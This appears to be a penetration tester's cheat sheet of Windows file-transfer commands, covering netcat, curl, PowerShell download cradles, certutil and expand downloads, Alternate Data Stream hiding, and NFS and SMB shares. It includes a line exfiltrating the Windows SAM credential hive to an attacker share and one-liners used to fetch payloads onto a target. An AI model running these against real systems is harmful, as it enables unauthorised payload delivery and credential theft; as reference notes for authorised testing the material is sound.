# Windows File Transfers

## Netcat

##### start listener on target
```sh
nc -nlvp [PORT] > [RECIVING_FILE]
```
##### send the file
```
nc [IP] [PORT] < [SENDING_FILE]
```

## Curl

```sh
curl -F "upload=@[FILE]" https://[IP]/[FILE]
```

```
curl -o [FILE] https://[IP]/[FILE]
```

## PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile("http://[IP]/[FILE]","C:\Path\To\[FILE]")
 ```
 ```powershell
Invoke-WebRequest 'http://[IP]/[FILE]' -OutFile "[FILE]"
```
```powershell
invoke-webrequest -uri http://[IP]/[FILE] -out C:\Path\To\[FILE]
```
```powershell
(New-Object System.Net.WebClient).UploadFile('http://[IP]/[FILE]','[FILE]')
```
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile(http://[IP]/[FILE]','[FILE]')"
```
```powershell
powershell iwr -uri http://[IP]/[FILE] -outfile [FILE]
```

##### PowerShell 3
```
(net.webclient).downloadstring("http://[IP]/[FILE]") > C:\Path\To\[FILE]
```
```
(net.webclient).downloadfile("http://[IP]/[FILE]", "C:\Path\To\[FILE]")
```


## certutil

```bat
certutil -urlcache -split -f http://[IP]/[FILE] [FILE]
```
```
certutil -verifyctl -f -split http://[IP]/[FILE] [FILE]
```

## expand
```
expand http://[IP]/[FILE] [FILE]
```
##### ADS
```Download from SBM share into Alternate Data Stream
expand \\[IP]\[FILE] C:\Path\To\[FILE]:[FILE]
```

## NFS Shares
```sh
sudo mkdir -p /mnt/[SHARE]
mount -t nfs -o vers=3 [IP]:/[FOLDER]/ /mnt/[SHARE]
```
```sh
sudo mkdir -p /mnt/[SHARE]
mount -t nfs -o vers=2 REMOTE_IP:/[FOLDER]/ /mnt/[SHARE]
```
##### Unmount
```sh
sudo umount /mnt/[SHARE]
```
##### Mount at Boot
```sh
[IP]:/[SHARE]/[FOLDER]  /mnt/[SHARE]  nfs  defaults,vers=3  0  0
```

## SMB Shares

##### Mount SMB Share
```sh
sudo mount -t cifs -o vers=1.0 //[REMOTE_IP]/[SHARE] /mnt/[SHARE]
```
##### Host SMB Share
```sh
sudo impacket-smbserver [SHARE] .
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\[SHARE]\sam.save
```
##### Upload from Target
```
copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
```
##### Upload with curl to Target
```sh
curl --upload-file /Path/To/[FILE] -u 'DOMAIN\[USER]' smb://[IP]/[SHARE]/
```
##### Use smbclient to Get ALL files from an SMB share
```sh
smbclient //[IP]/[SHARE]
RECURSE ON
PROMPT OFF
mget *
```